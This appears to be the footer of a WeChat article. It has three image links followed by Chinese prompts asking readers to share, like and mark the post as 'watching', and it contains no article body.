![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看